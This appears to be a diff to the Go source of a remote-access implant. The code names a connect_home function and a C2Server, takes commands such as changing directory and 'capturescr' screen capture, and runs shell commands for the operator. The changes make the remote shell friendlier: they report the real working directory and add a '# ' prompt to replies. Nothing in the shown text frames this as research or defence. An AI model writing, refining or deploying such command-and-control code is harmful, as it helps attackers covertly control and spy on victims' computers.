@@ -44,7 +44,8 @@ func main() {
 				if err := os.Chdir(tgt_dir); err != nil {
 					send_resp(conn, err.Error())
 				} else {
-					send_resp(conn, fmt.Sprintf("Dir changed successfully to %s", tgt_dir))
+					cur_wd, _ := os.Getwd()
+					send_resp(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
 				}
 			}
 		} else if cmd == "capturescr" {
@@ -81,7 +82,17 @@ func connect_home() (net.Conn, error) {
 
 // send the response back to the C2Server
 func send_resp(conn net.Conn, resp string) {
-	fmt.Fprintf(conn, "%s\n", resp)
+	tmp := ""
+	if resp[len(resp)-1] == '\n' {
+		tmp = "\n"
+	} else {
+		tmp = "\n\n"
+	}
+	if resp == "Closing connection" {
+		fmt.Fprintf(conn, "%s%s", resp, tmp)
+	} else {
+		fmt.Fprintf(conn, "%s%s# ", resp, tmp)
+	}
 }
 
 // execute a shell command and return the result
